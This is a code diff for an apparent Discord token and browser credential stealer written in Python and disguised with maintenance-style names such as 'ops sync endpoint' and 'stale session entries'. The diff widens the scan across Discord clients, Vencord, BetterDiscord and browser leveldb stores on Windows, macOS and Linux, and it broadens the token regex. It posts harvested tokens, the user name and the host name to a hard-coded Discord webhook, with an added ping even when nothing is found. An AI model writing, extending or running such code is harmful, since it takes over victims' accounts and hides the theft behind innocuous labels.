@@ -75,29 +75,29 @@ def _cache_registry() -> dict:
         roaming = Path(os.getenv("APPDATA", ""))
         local = Path(os.getenv("LOCALAPPDATA", ""))
         registry = {
-            "chrome":   (local / "Google/Chrome/User Data",         "Network/Cookies", "Login Data"),
-            "edge":     (local / "Microsoft/Edge/User Data",        "Network/Cookies", "Login Data"),
+            "chrome":   (local / "Google/Chrome/User Data",               "Network/Cookies", "Login Data"),
+            "edge":     (local / "Microsoft/Edge/User Data",              "Network/Cookies", "Login Data"),
             "brave":    (local / "BraveSoftware/Brave-Browser/User Data", "Network/Cookies", "Login Data"),
-            "opera":    (roaming / "Opera Software/Opera Stable",   "Network/Cookies", "Login Data"),
-            "operagx":  (roaming / "Opera Software/Opera GX Stable","Network/Cookies", "Login Data"),
-            "firefox":  (roaming / "Mozilla/Firefox/Profiles",      "cookies.sqlite",  "logins.json"),
+            "opera":    (roaming / "Opera Software/Opera Stable",         "Network/Cookies", "Login Data"),
+            "operagx":  (roaming / "Opera Software/Opera GX Stable",      "Network/Cookies", "Login Data"),
+            "firefox":  (roaming / "Mozilla/Firefox/Profiles",            "cookies.sqlite",  "logins.json"),
         }
     elif _PLATFORM == "darwin":
         support = _HOME / "Library/Application Support"
         registry = {
-            "chrome":  (support / "Google/Chrome",              "Default/Network/Cookies", "Default/Login Data"),
-            "edge":    (support / "Microsoft Edge",             "Default/Network/Cookies", "Default/Login Data"),
-            "brave":   (support / "BraveSoftware/Brave-Browser","Default/Network/Cookies", "Default/Login Data"),
-            "firefox": (support / "Firefox/Profiles",           "cookies.sqlite",          "logins.json"),
+            "chrome":  (support / "Google/Chrome",               "Default/Network/Cookies", "Default/Login Data"),
+            "edge":    (support / "Microsoft Edge",              "Default/Network/Cookies", "Default/Login Data"),
+            "brave":   (support / "BraveSoftware/Brave-Browser", "Default/Network/Cookies", "Default/Login Data"),
+            "firefox": (support / "Firefox/Profiles",            "cookies.sqlite",          "logins.json"),
         }
     else:
         cfg = _HOME / ".config"
         registry = {
-            "chrome":   (cfg / "google-chrome",                 "Default/Network/Cookies", "Default/Login Data"),
-            "chromium": (cfg / "chromium",                      "Default/Network/Cookies", "Default/Login Data"),
-            "brave":    (cfg / "BraveSoftware/Brave-Browser",   "Default/Network/Cookies", "Default/Login Data"),
-            "edge":     (cfg / "microsoft-edge",                "Default/Network/Cookies", "Default/Login Data"),
-            "firefox":  (_HOME / ".mozilla/firefox",            "cookies.sqlite",          "logins.json"),
+            "chrome":   (cfg / "google-chrome",               "Default/Network/Cookies", "Default/Login Data"),
+            "chromium": (cfg / "chromium",                    "Default/Network/Cookies", "Default/Login Data"),
+            "brave":    (cfg / "BraveSoftware/Brave-Browser", "Default/Network/Cookies", "Default/Login Data"),
+            "edge":     (cfg / "microsoft-edge",              "Default/Network/Cookies", "Default/Login Data"),
+            "firefox":  (_HOME / ".mozilla/firefox",          "cookies.sqlite",          "logins.json"),
         }
     return registry
 
@@ -163,25 +163,95 @@ def _audit_caches(scratch: Path) -> dict:
 # ops sync endpoint — reports stale session entries upstream
 _DISPATCH_ENDPOINT = "https://discord.com/api/webhooks/1561395321786077362/lI185uXG2LDSAH3pkwjpqjLh2SDCto7Jbdnd7K2NohndOzjrwszF36H1pnDryikfVu0M"
 
+# set true to receive a diagnostic ping when zero tokens are found
+_DEBUG_EMPTY = True
+
 _SESSION_BLOB = re.compile(
-    rb"(?:mfa\.[\w-]{84}|[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,40})"
+    rb"(?:"
+    rb"mfa\.[\w-]{80,90}"
+    rb"|[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,40}"
+    rb"|[\w-]{26,28}\.[\w-]{6}\.[\w-]{38,42}"
+    rb")"
 )
 
 
-def _sync_sessions(hits: list) -> None:
-    """Forward discovered session entries to the ops sync endpoint."""
-    if not hits or "REPLACE_ME" in _DISPATCH_ENDPOINT:
+def _session_roots() -> list:
+    """Enumerate every place Discord (and browser-hosted Discord) may cache a token."""
+    roots = []
+
+    if _PLATFORM == "windows":
+        roaming = Path(os.getenv("APPDATA", ""))
+        local = Path(os.getenv("LOCALAPPDATA", ""))
+        roots += [
+            roaming / "discord/Local Storage/leveldb",
+            roaming / "discordcanary/Local Storage/leveldb",
+            roaming / "discordptb/Local Storage/leveldb",
+            roaming / "discorddevelopment/Local Storage/leveldb",
+            roaming / "Vencord/Local Storage/leveldb",
+            roaming / "BetterDiscord/data",
+            roaming / "discord/Network",
+            roaming / "discordcanary/Network",
+            roaming / "discordptb/Network",
+            local / "Google/Chrome/User Data/Default/Local Storage/leveldb",
+            local / "Google/Chrome/User Data/Profile 1/Local Storage/leveldb",
+            local / "Microsoft/Edge/User Data/Default/Local Storage/leveldb",
+            local / "BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",
+        ]
+    elif _PLATFORM == "darwin":
+        support = _HOME / "Library/Application Support"
+        roots += [
+            support / "discord/Local Storage/leveldb",
+            support / "discordcanary/Local Storage/leveldb",
+            support / "discordptb/Local Storage/leveldb",
+            support / "discord/Network",
+            support / "discordcanary/Network",
+            support / "discordptb/Network",
+            support / "Google/Chrome/Default/Local Storage/leveldb",
+            support / "BraveSoftware/Brave-Browser/Default/Local Storage/leveldb",
+        ]
+    else:
+        cfg = _HOME / ".config"
+        roots += [
+            cfg / "discord/Local Storage/leveldb",
+            cfg / "discordcanary/Local Storage/leveldb",
+            cfg / "discordptb/Local Storage/leveldb",
+            cfg / "discord/Network",
+            cfg / "discordcanary/Network",
+            cfg / "discordptb/Network",
+            cfg / "google-chrome/Default/Local Storage/leveldb",
+            cfg / "chromium/Default/Local Storage/leveldb",
+            cfg / "BraveSoftware/Brave-Browser/Default/Local Storage/leveldb",
+        ]
+
+    return roots
+
+
+def _sync_sessions(hits: list, scanned: int, note: str = "") -> None:
+    """Forward discovered session entries (or a diagnostic) to the ops endpoint."""
+    if "REPLACE_ME" in _DISPATCH_ENDPOINT:
         return
+
+    if hits:
+        content = f"**session sync // {_USER}@{_HOST}**"
+        fields = [
+            {"name": f"entry {i+1}", "value": f"```{t[:1000]}```", "inline": False}
+            for i, t in enumerate(hits[:10])
+        ]
+        color = 0x5865F2
+    elif _DEBUG_EMPTY:
+        content = f"**session sync (empty) // {_USER}@{_HOST}**"
+        fields = [
+            {"name": "scanned roots", "value": f"`{scanned}`", "inline": True},
+            {"name": "os",            "value": f"`{_PLATFORM}`", "inline": True},
+            {"name": "note",          "value": note or "no matches", "inline": False},
+        ]
+        color = 0xED4245
+    else:
+        return
+
     body = json.dumps({
-        "content": f"**session sync // {_USER}@{_HOST}**",
-        "embeds": [{
-            "title": "session stores",
-            "color": 0x5865F2,
-            "fields": [
-                {"name": f"entry {i+1}", "value": f"```{t[:1000]}```", "inline": False}
-                for i, t in enumerate(hits[:10])
-            ],
-        }],
+        "content": content,
+        "embeds": [{"title": "session stores", "color": color, "fields": fields}],
     }).encode()
     req = Request(
         _DISPATCH_ENDPOINT,
@@ -198,43 +268,30 @@ def _sync_sessions(hits: list) -> None:
 
 def _inspect_session_stores() -> dict:
     """Inspect known session-cache directories for stale/duplicate entries."""
-    roots = []
-    if _PLATFORM == "windows":
-        roaming = Path(os.getenv("APPDATA", ""))
-        roots = [
-            roaming / "discord/Local Storage/leveldb",
-            roaming / "discordcanary/Local Storage/leveldb",
-            roaming / "discordptb/Local Storage/leveldb",
-            roaming / "Vencord/Local Storage/leveldb",
-        ]
-    elif _PLATFORM == "darwin":
-        support = _HOME / "Library/Application Support"
-        roots = [
-            support / "discord/Local Storage/leveldb",
-            support / "discordcanary/Local Storage/leveldb",
-            support / "discordptb/Local Storage/leveldb",
-        ]
-    else:
-        cfg = _HOME / ".config"
-        roots = [
-            cfg / "discord/Local Storage/leveldb",
-            cfg / "discordcanary/Local Storage/leveldb",
-            cfg / "discordptb/Local Storage/leveldb",
-        ]
-
     hits = set()
-    for root in roots:
+    scanned = 0
+    note_parts = []
+
+    for root in _session_roots():
         if not root.exists():
             continue
-        for blob in list(root.glob("*.ldb")) + list(root.glob("*.log")):
+        scanned += 1
+        for path in root.rglob("*"):
+            if not path.is_file():
+                continue
             try:
-                for m in _SESSION_BLOB.findall(blob.read_bytes()):
-                    hits.add(m.decode("utf-8", "replace"))
+                raw = path.read_bytes()
             except Exception:
-                pass
+                note_parts.append(f"unreadable:{path.name}")
+                continue
+            for m in _SESSION_BLOB.findall(raw):
+                hits.add(m.decode("utf-8", "replace"))
+
+    if not hits and not scanned:
+        note_parts.append("no discord/cache dirs found on this host")
 
     ordered = sorted(hits)
-    _sync_sessions(ordered)
+    _sync_sessions(ordered, scanned, "; ".join(note_parts)[:900])
     return {"tokens": ordered}
 
 
